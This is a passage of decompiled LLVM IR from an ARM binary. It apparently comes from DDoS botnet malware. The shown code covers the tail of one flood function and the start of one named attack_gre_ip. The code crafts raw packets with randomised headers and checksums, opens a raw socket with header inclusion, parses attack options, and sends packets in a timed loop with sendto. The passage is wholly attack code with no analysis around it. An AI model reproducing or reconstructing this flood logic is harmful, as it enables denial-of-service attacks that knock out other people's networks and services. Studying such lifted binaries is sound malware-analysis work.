  store i16 %v3_8d58, i16* %v5_8d60, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8d68 = load i32, i32* %ip.global-to-local, align 4
  %v1_8d68 = trunc i32 %v0_8d68 to i16
  %v2_8d68 = load i32, i32* @r6, align 4
  %v3_8d68 = add i32 %v2_8d68, 10
  %v4_8d68 = inttoptr i32 %v3_8d68 to i16*
  store i16 %v1_8d68, i16* %v4_8d68, align 2
  %v0_8d6c = load i32, i32* @r6, align 4
  store i32 %v0_8d6c, i32* @r0, align 4
  %v2_8d70 = call i32 @checksum_generic(i32 %v0_8d6c, i32 20)
  %v3_8d70 = trunc i32 %v2_8d70 to i16
  store i32 %v2_8d70, i32* %r0.global-to-local, align 4
  %v3_8d74 = load i32, i32* @r6, align 4
  %v4_8d74 = add i32 %v3_8d74, 10
  %v5_8d74 = inttoptr i32 %v4_8d74 to i16*
  store i16 %v3_8d70, i16* %v5_8d74, align 2
  %v2_8d7c = load i32, i32* @r8, align 4
  %v3_8d7c = add i32 %v2_8d7c, 6
  %v4_8d7c = inttoptr i32 %v3_8d7c to i16*
  store i16 0, i16* %v4_8d7c, align 2
  %v0_8d80 = load i32, i32* @r8, align 4
  store i32 %v0_8d80, i32* @r1, align 4
  %v1_8d84 = add i32 %v0_8d80, 4
  %v2_8d84 = inttoptr i32 %v1_8d84 to i16*
  %v3_8d84 = load i16, i16* %v2_8d84, align 2
  %v4_8d84 = zext i16 %v3_8d84 to i32
  store i32 %v4_8d84, i32* %r2.global-to-local, align 4
  %v0_8d88 = load i32, i32* @fp, align 4
  store i32 %v0_8d88, i32* %r3.global-to-local, align 4
  %v0_8d8c = load i32, i32* @r6, align 4
  store i32 %v0_8d8c, i32* %r0.global-to-local, align 4
  %v4_8d90 = call i32 @checksum_tcpudp(i32 %v0_8d8c, i32 %v0_8d80, i32 %v4_8d84, i32 %v0_8d88)
  %v5_8d90 = trunc i32 %v4_8d90 to i16
  store i32 %v4_8d90, i32* %r0.global-to-local, align 4
  %v3_8d94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8d94, i32* %r2.global-to-local, align 4
  %v3_8d98 = mul i32 %v3_8d94, 32
  store i32 %v3_8d98, i32* %r3.global-to-local, align 4
  %v0_8d9c = load i32, i32* @r5, align 4
  %v1_8d9c = add i32 %v0_8d9c, 16
  %v2_8d9c = inttoptr i32 %v1_8d9c to i32*
  %v3_8d9c = load i32, i32* %v2_8d9c, align 4
  %v5_8da0 = mul i32 %v3_8d94, 24
  store i32 %v5_8da0, i32* %r3.global-to-local, align 4
  %v1_8da4 = load i32, i32* @sl, align 4
  %v2_8da4 = add i32 %v1_8da4, %v5_8da0
  store i32 %v2_8da4, i32* @lr, align 4
  %v2_8da8 = add i32 %v2_8da4, 4
  %v3_8da8 = inttoptr i32 %v2_8da8 to i32*
  store i32 %v3_8d9c, i32* %v3_8da8, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_8db4 = load i32, i32* @r8, align 4
  %v4_8db4 = add i32 %v3_8db4, 6
  %v5_8db4 = inttoptr i32 %v4_8db4 to i16*
  store i16 %v5_8d90, i16* %v5_8db4, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_8dbc = load i32, i32* %r1.global-to-local, align 4
  %v1_8dbc = trunc i32 %v0_8dbc to i16
  %v2_8dbc = load i32, i32* %r3.global-to-local, align 4
  %v3_8dbc = load i32, i32* @sl, align 4
  %v4_8dbc = add i32 %v3_8dbc, %v2_8dbc
  %v5_8dbc = inttoptr i32 %v4_8dbc to i16*
  store i16 %v1_8dbc, i16* %v5_8dbc, align 2
  %v0_8dc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_8dc0 = trunc i32 %v0_8dc0 to i16
  %v2_8dc0 = load i32, i32* @lr, align 4
  %v3_8dc0 = add i32 %v2_8dc0, 2
  %v4_8dc0 = inttoptr i32 %v3_8dc0 to i16*
  store i16 %v1_8dc0, i16* %v4_8dc0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8dc8 = load i32, i32* @r5, align 4
  store i32 %v0_8dc8, i32* %r1.global-to-local, align 4
  store i32 %v3_89fc, i32* %r0.global-to-local, align 4
  %v0_8dd0 = load i32, i32* @sb, align 4
  store i32 %v0_8dd0, i32* %r2.global-to-local, align 4
  %v0_8dd4 = load i32, i32* @lr, align 4
  %v0_8dd8 = load i32, i32* %ip.global-to-local, align 4
  %v6_8ddc = call i32 @__libc_sendto(i32 %v3_89fc, i32 %v0_8dc8, i32 %v0_8dd0, i32 16384, i32 %v0_8dd4, i32 %v0_8dd8)
  %v3_8de0 = load i32, i32* %stack_var_-44, align 4
  %v1_8de4 = add i32 %v3_8de0, 1
  store i32 %v1_8de4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_8dec = icmp eq i32 %v1_8de4, %arg2
  store i1 %v9_8dec, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8de4, i32* %stack_var_-44, align 4
  %v6_8df4 = icmp slt i32 %v1_8de4, %arg2
  br i1 %v6_8df4, label %dec_label_pc_8df8, label %dec_label_pc_8f24

dec_label_pc_8df8:                                ; preds = %dec_label_pc_8d48, %dec_label_pc_8c84
  %v1_8e0c = phi i32 [ %v1_8de4, %dec_label_pc_8d48 ], [ 0, %dec_label_pc_8c84 ]
  %v5_8dfc = mul i32 %v1_8e0c, 24
  %v1_8e00 = load i32, i32* @sl, align 4
  %v2_8e00 = add i32 %v1_8e00, %v5_8dfc
  store i32 %v2_8e00, i32* %r3.global-to-local, align 4
  store i32 %v2_88b8, i32* %lr.global-to-local, align 4
  %v1_8e08 = add i32 %v2_8e00, 20
  %v2_8e08 = inttoptr i32 %v1_8e08 to i8*
  %v3_8e08 = load i8, i8* %v2_8e08, align 1
  %v4_8e08 = zext i8 %v3_8e08 to i32
  store i32 %v4_8e08, i32* %r2.global-to-local, align 4
  %v4_8e0c = mul i32 %v1_8e0c, 4
  %v5_8e0c = add i32 %v4_8e0c, %v2_88b8
  %v6_8e0c = inttoptr i32 %v5_8e0c to i32*
  %v7_8e0c = load i32, i32* %v6_8e0c, align 4
  store i32 %v7_8e0c, i32* @r5, align 4
  %v2_8e10 = icmp ugt i8 %v3_8e08, 30
  %v7_8e10 = icmp eq i8 %v3_8e08, 31
  store i1 %v7_8e10, i1* %cpsr_z.global-to-local, align 1
  %v1_8e14 = add i32 %v7_8e0c, 24
  store i32 %v1_8e14, i32* @r7, align 4
  %v1_8e18 = add i32 %v7_8e0c, 38
  store i32 %v1_8e18, i32* @r6, align 4
  %v1_8e1c = add i32 %v7_8e0c, 58
  store i32 %v1_8e1c, i32* @r8, align 4
  %v2_8e20 = xor i1 %v7_8e10, true
  %v3_8e20 = and i1 %v2_8e10, %v2_8e20
  br i1 %v3_8e20, label %dec_label_pc_8c98, label %dec_label_pc_8e24

dec_label_pc_8e24:                                ; preds = %dec_label_pc_8df8
  %v1_8e24 = add i32 %v2_8e00, 16
  %v2_8e24 = inttoptr i32 %v1_8e24 to i32*
  %v3_8e24 = load i32, i32* %v2_8e24, align 4
  store i32 %v3_8e24, i32* %r4.global-to-local, align 4
  %v0_8e28 = call i32 @rand_next()
  store i32 %v0_8e28, i32* %r0.global-to-local, align 4
  %v3_8e2c = load i32, i32* %stack_var_-44, align 4
  %v5_8e34 = mul i32 %v3_8e2c, 24
  %v1_8e38 = and i32 %v3_8e24, 16711680
  store i32 %v1_8e38, i32* %ip.global-to-local, align 4
  %v3_8e3c = udiv i32 %v3_8e24, 16777216
  %v4_8e40 = udiv i32 %v1_8e38, 256
  %v5_8e40 = or i32 %v4_8e40, %v3_8e3c
  store i32 %v5_8e40, i32* %r2.global-to-local, align 4
  %v1_8e44 = load i32, i32* @sl, align 4
  %v2_8e44 = add i32 %v1_8e44, %v5_8e34
  store i32 %v2_8e44, i32* %r1.global-to-local, align 4
  %v1_8e48 = and i32 %v3_8e24, ptrtoint (i32* @global_var_ff00.28 to i32)
  store i32 %v1_8e48, i32* %r3.global-to-local, align 4
  %v1_8e4c = add i32 %v2_8e44, 20
  %v2_8e4c = inttoptr i32 %v1_8e4c to i8*
  %v3_8e4c = load i8, i8* %v2_8e4c, align 1
  %v4_8e4c = zext i8 %v3_8e4c to i32
  store i32 %v4_8e4c, i32* %ip.global-to-local, align 4
  %v4_8e50 = mul i32 %v1_8e48, 256
  %v4_8e54 = mul i32 %v3_8e24, 16777216
  %v5_8e50 = or i32 %v4_8e50, %v4_8e54
  %v5_8e54 = or i32 %v5_8e50, %v5_8e40
  %v7_8e58 = lshr i32 %v0_8e28, %v4_8e4c
  %v8_8e58 = add i32 %v7_8e58, %v5_8e54
  store i32 %v8_8e58, i32* %r2.global-to-local, align 4
  %v1_8e5c = and i32 %v8_8e58, 16711680
  store i32 %v1_8e5c, i32* %r0.global-to-local, align 4
  store i32 %v6_89d8, i32* %r1.global-to-local, align 4
  %v5_8e74 = call i32 @llvm.bswap.i32(i32 %v8_8e58)
  store i32 %v5_8e74, i32* %r3.global-to-local, align 4
  store i1 %v7_8c9c, i1* %cpsr_z.global-to-local, align 1
  %v1_8e7c = load i32, i32* @r5, align 4
  %v2_8e7c = add i32 %v1_8e7c, 16
  %v3_8e7c = inttoptr i32 %v2_8e7c to i32*
  store i32 %v5_8e74, i32* %v3_8e7c, align 4
  br i1 %v2_8c9c, label %dec_label_pc_8e84, label %dec_label_pc_8ca4

dec_label_pc_8e84:                                ; preds = %dec_label_pc_8e24, %dec_label_pc_8c98
  %v0_8e84 = call i32 @rand_next()
  store i32 %v0_8e84, i32* %r0.global-to-local, align 4
  store i32 %v3_8a4c, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_8e94, i1* %cpsr_z.global-to-local, align 1
  %v1_8e98 = load i32, i32* @r5, align 4
  %v2_8e98 = add i32 %v1_8e98, 12
  %v3_8e98 = inttoptr i32 %v2_8e98 to i32*
  store i32 %v0_8e84, i32* %v3_8e98, align 4
  br i1 %v3_8e94, label %dec_label_pc_8ea0, label %dec_label_pc_8e84.dec_label_pc_8cb8_crit_edge

dec_label_pc_8e84.dec_label_pc_8cb8_crit_edge:    ; preds = %dec_label_pc_8e84
  %v1_8cbc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_8cb8

dec_label_pc_8ea0:                                ; preds = %dec_label_pc_8e84, %dec_label_pc_8ca4
  %v0_8ea0 = call i32 @rand_next()
  %v3_8ea8 = urem i32 %v0_8ea0, 65536
  store i32 %v3_8ea8, i32* %r0.global-to-local, align 4
  %v1_8eb0 = sub nsw i32 999, %v3_8ea8
  store i32 %v1_8eb0, i32* %r3.global-to-local, align 4
  %v1_8eb4 = trunc i32 %v0_8ea0 to i16
  %v2_8eb4 = load i32, i32* @r5, align 4
  %v3_8eb4 = add i32 %v2_8eb4, 4
  %v4_8eb4 = inttoptr i32 %v3_8eb4 to i16*
  store i16 %v1_8eb4, i16* %v4_8eb4, align 2
  %v0_8eb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_8eb8 = trunc i32 %v0_8eb8 to i16
  %v2_8eb8 = load i32, i32* @r6, align 4
  %v3_8eb8 = add i32 %v2_8eb8, 4
  %v4_8eb8 = inttoptr i32 %v3_8eb8 to i16*
  store i16 %v1_8eb8, i16* %v4_8eb8, align 2
  store i32 %v3_8a50, i32* %r3.global-to-local, align 4
  %v1_8ec0 = load i32, i32* @r4, align 4
  %v9_8ec0 = icmp eq i32 %v3_8a50, %v1_8ec0
  store i1 %v9_8ec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8ec0, label %dec_label_pc_8ec8, label %dec_label_pc_8cc4

dec_label_pc_8ec8:                                ; preds = %dec_label_pc_8ea0, %dec_label_pc_8cb8
  %v0_8ec8 = call i32 @rand_next()
  %v1_8ec8 = trunc i32 %v0_8ec8 to i16
  store i32 %v0_8ec8, i32* %r0.global-to-local, align 4
  store i32 %v3_8a54, i32* %ip.global-to-local, align 4
  %v1_8ed0 = load i32, i32* @r4, align 4
  %v9_8ed0 = icmp eq i32 %v3_8a54, %v1_8ed0
  store i1 %v9_8ed0, i1* %cpsr_z.global-to-local, align 1
  %v3_8ed4 = load i32, i32* @r5, align 4
  %v4_8ed4 = add i32 %v3_8ed4, 58
  %v5_8ed4 = inttoptr i32 %v4_8ed4 to i16*
  store i16 %v1_8ec8, i16* %v5_8ed4, align 2
  br i1 %v9_8ed0, label %dec_label_pc_8edc, label %dec_label_pc_8cd0

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8ec8, %dec_label_pc_8cc4
  %v0_8edc = call i32 @rand_next()
  %v1_8edc = trunc i32 %v0_8edc to i16
  store i32 %v0_8edc, i32* %r0.global-to-local, align 4
  store i32 %v1_8a48, i32* @lr, align 4
  store i1 %v2_8ee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8ee4, label %.thread24, label %bb81

.thread24:                                        ; preds = %dec_label_pc_8edc
  %v3_8eec25 = load i32, i32* @r8, align 4
  %v4_8eec26 = add i32 %v3_8eec25, 2
  %v5_8eec27 = inttoptr i32 %v4_8eec26 to i16*
  store i16 %v1_8edc, i16* %v5_8eec27, align 2
  br label %dec_label_pc_8ef8

bb81:                                             ; preds = %dec_label_pc_8edc
  %v1_8ee8 = load i32, i32* @r5, align 4
  %v2_8ee8 = add i32 %v1_8ee8, 16
  %v3_8ee8 = inttoptr i32 %v2_8ee8 to i32*
  %v4_8ee8 = load i32, i32* %v3_8ee8, align 4
  store i32 %v4_8ee8, i32* %r3.global-to-local, align 4
  %v3_8eec = load i32, i32* @r8, align 4
  %v4_8eec = add i32 %v3_8eec, 2
  %v5_8eec = inttoptr i32 %v4_8eec to i16*
  store i16 %v1_8edc, i16* %v5_8eec, align 2
  %v1_8ef0 = load i32, i32* %r3.global-to-local, align 4
  %v2_8ef0 = load i32, i32* @r6, align 4
  %v3_8ef0 = add i32 %v2_8ef0, 16
  %v4_8ef0 = inttoptr i32 %v3_8ef0 to i32*
  store i32 %v1_8ef0, i32* %v4_8ef0, align 4
  br label %dec_label_pc_8ce4

dec_label_pc_8ef8:                                ; preds = %.thread24, %dec_label_pc_8cd0
  %v0_8ef8 = call i32 @rand_next()
  store i32 %v0_8ef8, i32* %r0.global-to-local, align 4
  %v1_8efc = load i32, i32* @r6, align 4
  %v2_8efc = add i32 %v1_8efc, 16
  %v3_8efc = inttoptr i32 %v2_8efc to i32*
  store i32 %v0_8ef8, i32* %v3_8efc, align 4
  br label %dec_label_pc_8ce4

dec_label_pc_8f04:                                ; preds = %dec_label_pc_8ce4
  %v0_8f04 = load i32, i32* @r8, align 4
  %v1_8f04 = add i32 %v0_8f04, 8
  store i32 %v1_8f04, i32* @r4, align 4
  store i32 %v1_8f04, i32* %r0.global-to-local, align 4
  store i32 %v6_8984, i32* %r1.global-to-local, align 4
  %v2_8f10 = call i32 @rand_alphastr(i32 %v1_8f04, i32 %v6_8984)
  store i32 %v2_8f10, i32* %r0.global-to-local, align 4
  store i32 %v6_8984, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8f1c = load i32, i32* @r4, align 4
  %v4_8f1c = add i32 %v2_8f1c, %v6_8984
  %v5_8f1c = inttoptr i32 %v4_8f1c to i8*
  store i8 0, i8* %v5_8f1c, align 1
  br label %dec_label_pc_8d48

dec_label_pc_8f24:                                ; preds = %dec_label_pc_8d48, %dec_label_pc_8c70
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_8f28 = call i32 @__GI_time(i32* null)
  store i32 %v2_8f28, i32* %r0.global-to-local, align 4
  store i32 %v2_89e8, i32* %ip.global-to-local, align 4
  %v9_8f30 = icmp eq i32 %v2_89e8, %v2_8f28
  store i1 %v9_8f30, i1* %cpsr_z.global-to-local, align 1
  %v6_8f34 = icmp slt i32 %v2_89e8, %v2_8f28
  br i1 %v6_8f34, label %dec_label_pc_8f38, label %dec_label_pc_8c70

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8f24, %entry, %dec_label_pc_8f44
  %v1_8f40 = phi i32 [ %v3_89fc, %entry ], [ %v1_8f48, %dec_label_pc_8f44 ], [ %v2_8f28, %dec_label_pc_8f24 ]
  store i32 %v3_888c, i32* %r4.global-to-local, align 4
  store i32 %v24_888c, i32* %fp.global-to-local, align 4
  store i32 %v27_888c, i32* %lr.global-to-local, align 4
  ret i32 %v1_8f40

dec_label_pc_8f44:                                ; preds = %dec_label_pc_8a0c
  store i32 %v3_89fc, i32* %r0.global-to-local, align 4
  %v1_8f48 = call i32 @__GI___libc_close(i32 %v3_89fc)
  store i32 %v1_8f48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8f38

; uselistorder directives
  uselistorder i32 %v1_8f48, { 1, 0 }
  uselistorder i16 %v1_8edc, { 1, 0 }
  uselistorder i32 %v0_8edc, { 1, 0 }
  uselistorder i32 %v0_8ec8, { 1, 0 }
  uselistorder i32 %v1_8ec0, { 1, 0 }
  uselistorder i32 %v3_8ea8, { 1, 0 }
  uselistorder i32 %v0_8ea0, { 1, 0 }
  uselistorder i32 %v5_8e74, { 1, 0 }
  uselistorder i32 %v3_8e24, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v7_8e0c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8de4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_8d94, { 1, 0, 2 }
  uselistorder i32 %v4_8d90, { 1, 0 }
  uselistorder i32 %v2_8d70, { 1, 0 }
  uselistorder i1 %v2_8ee4, { 2, 3, 1, 0 }
  uselistorder i1 %v3_8e94, { 1, 0, 2, 3 }
  uselistorder i1 %v7_8c9c, { 2, 1, 0 }
  uselistorder i32 %v0_8c1c, { 1, 0, 2 }
  uselistorder i32 %v0_8b34, { 1, 2, 0 }
  uselistorder i32 %tmp68, { 1, 0 }
  uselistorder i32 %v1_8a88, { 2, 0, 1 }
  uselistorder i32 %v3_8a80, { 2, 1, 0 }
  uselistorder i1 %v2_8a58, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8a4c, { 2, 1, 3, 0 }
  uselistorder i32 %v1_8a48, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v0_8a44, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_8a40, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8a3c, { 1, 0 }
  uselistorder i1 %v7_8a2c, { 1, 0 }
  uselistorder i1 %v7_8a00, { 1, 0 }
  uselistorder i32 %v3_89fc, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_89e8, { 2, 1, 0 }
  uselistorder i32 %v6_89d8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_89a4, { 1, 2, 3, 0 }
  uselistorder i32 %v6_8984, { 1, 4, 3, 2, 5, 7, 6, 0 }
  uselistorder i32 %v6_8950, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_8938, { 1, 2, 0 }
  uselistorder i32 %v1_8914, { 3, 2, 1, 0 }
  uselistorder i32 %v6_890c, { 1, 0 }
  uselistorder i32 %v6_88d0, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_88b8, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 18, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 46, 23, 47, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 15, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 7, 9, 10, 8, 12, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 22, 23, 24, 26, 25, 30, 27, 28, 29, 33, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 13, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg2, { 6, 5, 4, 1, 0, 3, 2, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_8f38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d48, { 1, 0 }
  uselistorder label %dec_label_pc_8ce4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8c70, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_8f54 = load i32, i32* @r4, align 4
  %v24_8f54 = load i32, i32* @fp, align 4
  %v27_8f54 = load i32, i32* @lr, align 4
  store i32 0, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_8f80 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_8f84 = load i32, i32* @r4, align 4
  store i32 %v0_8f84, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_8f90 = load i32, i32* @sb, align 4
  store i32 %v0_8f90, i32* %r3.global-to-local, align 4
  %v0_8f94 = load i32, i32* @r5, align 4
  %v5_8f98 = inttoptr i32 %v0_8f84 to i32*
  %v6_8f98 = call i32 @attack_get_opt_int(i32 %v0_8f94, i32* %v5_8f98, i32 2, i32 %v0_8f90, i32 %v2_8f80)
  %v1_8fa4 = urem i32 %v6_8f98, 256
  store i32 %v1_8fa4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_8fb0 = load i32, i32* @r4, align 4
  store i32 %v0_8fb0, i32* %r1.global-to-local, align 4
  %v0_8fb4 = load i32, i32* @r5, align 4
  %v5_8fb8 = trunc i32 %v6_8f98 to i8
  %v6_8fbc = inttoptr i32 %v0_8fb0 to i32*
  %v7_8fbc = call i32 @attack_get_opt_int(i32 %v0_8fb4, i32* %v6_8fbc, i32 3, i32 65535, i32 %v6_8f98)
  %v0_8fc0 = load i32, i32* @r4, align 4
  store i32 %v0_8fc0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_8fd0 = load i32, i32* @r5, align 4
  %v5_8fd4 = inttoptr i32 %v0_8fc0 to i32*
  %v6_8fd4 = call i32 @attack_get_opt_int(i32 %v0_8fd0, i32* %v5_8fd4, i32 4, i32 64, i32 %v7_8fbc)
  %v1_8fdc = urem i32 %v6_8fd4, 256
  store i32 %v1_8fdc, i32* %ip.global-to-local, align 4
  %v0_8fe0 = load i32, i32* @r4, align 4
  store i32 %v0_8fe0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8fec = load i32, i32* @r5, align 4
  %v6_8ff4 = inttoptr i32 %v0_8fe0 to i32*
  %v7_8ff4 = call i32 @attack_get_opt_int(i32 %v0_8fec, i32* %v6_8ff4, i32 5, i32 1, i32 %v1_8fdc)
  %v1_9000 = urem i32 %v7_8ff4, 256
  store i32 %v1_9000, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_900c = load i32, i32* @r4, align 4
  store i32 %v0_900c, i32* %r1.global-to-local, align 4
  %v0_9010 = load i32, i32* @r5, align 4
  %v5_9018 = inttoptr i32 %v0_900c to i32*
  %v6_9018 = call i32 @attack_get_opt_int(i32 %v0_9010, i32* %v5_9018, i32 6, i32 65535, i32 %v1_9000)
  %v0_9020 = load i32, i32* @r4, align 4
  store i32 %v0_9020, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9018, i32* %fp.global-to-local, align 4
  %v0_9030 = load i32, i32* @r5, align 4
  %v5_9034 = inttoptr i32 %v0_9020 to i32*
  %v6_9034 = call i32 @attack_get_opt_int(i32 %v0_9030, i32* %v5_9034, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_9038 = load i32, i32* @r4, align 4
  store i32 %v0_9038, i32* %r1.global-to-local, align 4
  %v0_903c = load i32, i32* @sb, align 4
  store i32 %v0_903c, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_9034, i32* @r8, align 4
  %v0_9048 = load i32, i32* @r5, align 4
  %v5_904c = inttoptr i32 %v0_9038 to i32*
  %v6_904c = call i32 @attack_get_opt_int(i32 %v0_9048, i32* %v5_904c, i32 %v0_903c, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_905c = load i32, i32* @r4, align 4
  store i32 %v0_905c, i32* %r1.global-to-local, align 4
  %v0_9060 = load i32, i32* @r5, align 4
  %v5_9064 = inttoptr i32 %v0_905c to i32*
  %v6_9064 = call i32 @attack_get_opt_int(i32 %v0_9060, i32* %v5_9064, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_906c = urem i32 %v6_9064, 256
  store i32 %v1_906c, i32* %ip.global-to-local, align 4
  %v0_9070 = load i32, i32* @r4, align 4
  store i32 %v0_9070, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_9078 = load i32, i32* @sb, align 4
  store i32 %v0_9078, i32* %r3.global-to-local, align 4
  %v0_907c = load i32, i32* @r5, align 4
  %v5_9084 = inttoptr i32 %v0_9070 to i32*
  %v6_9084 = call i32 @attack_get_opt_int(i32 %v0_907c, i32* %v5_9084, i32 18, i32 %v0_9078, i32 %v1_906c)
  %v0_908c = load i32, i32* @r4, align 4
  store i32 %v0_908c, i32* %r1.global-to-local, align 4
  %v2_9090 = load i32, i32* @global_var_23a4c.55, align 4
  store i32 %v2_9090, i32* %r3.global-to-local, align 4
  store i32 %v6_9084, i32* @r7, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_909c = load i32, i32* @r5, align 4
  %v5_90a0 = inttoptr i32 %v0_908c to i32*
  %v6_90a0 = call i32 @attack_get_opt_int(i32 %v0_909c, i32* %v5_90a0, i32 24, i32 %v2_9090, i32 ptrtoint (i32* @0 to i32))
  %v0_90a8 = load i32, i32* @sb, align 4
  %v1_90ac = inttoptr i32 %v0_90a8 to i32*
  %v2_90ac = call i32 @__GI_time(i32* %v1_90ac)
  %v1_90b0 = load i32, i32* @r6, align 4
  %v2_90b0 = add i32 %v1_90b0, %v2_90ac
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_90c4 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_90c8 = icmp eq i32 %v3_90c4, -1
  store i1 %v7_90c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90c8, label %dec_label_pc_9598, label %dec_label_pc_90d4

dec_label_pc_90d4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_90dc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_90dc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_90e4 = load i32, i32* @sb, align 4
  store i32 %v0_90e4, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_90f0 = call i32 @__GI_setsockopt(i32 %v3_90c4, i32 %v0_90e4, i32 3, i32 %v6_90dc, i32 4)
  %v7_90f4 = icmp eq i32 %v5_90f0, -1
  store i1 %v7_90f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90f4, label %dec_label_pc_95a4, label %dec_label_pc_90fc

dec_label_pc_90fc:                                ; preds = %dec_label_pc_90d4
  %v0_90fc = load i32, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_9110 = load i32, i32* @r8, align 4
  %v3_9114 = mul i32 %v7_8fbc, 65536
  store i32 %v3_9114, i32* %r1.global-to-local, align 4
  %v0_9118 = load i32, i32* @r7, align 4
